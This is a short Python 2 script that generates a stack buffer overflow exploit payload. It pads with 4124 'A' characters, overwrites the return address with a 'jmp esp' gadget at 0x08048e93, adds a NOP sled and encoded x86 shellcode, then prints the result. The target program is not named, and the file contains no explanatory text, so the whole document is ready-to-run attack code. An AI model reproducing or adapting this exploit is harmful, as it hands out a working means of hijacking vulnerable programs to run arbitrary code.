#/usr/bin/python

shellcode = "\xdb\xc6\xd9\x74\x24\xf4\x5a\xb8\x7e\xda\xf3\x36\x31\xc9\xb1\x0b\x83\xea\xfc\x31\x42\x16\x03\x42\x16\xe2\x8b\xb0\xf8\x6e\xea\x17\x99\xe6\x21\xfb\xec\x10\x51\xd4\x9d\xb6\xa1\x42\x4d\x25\xc8\xfc\x18\x4a\x58\xe9\x13\x8d\x5c\xe9\x0c\xef\x35\x87\x7d\x9c\xad\x57\xd5\x31\xa4\xb9\x14\x35"

content = 'A' * 4124
content += "\x93\x8e\x04\x08"               # 0x08048e93 jmp esp
content += "\x90" * 20                       # padding 20 NOPs to protect shellcode
content += shellcode
content += 'C' * (5000 - 4124 - 4 -20 -70)  # padding with 'C'

print content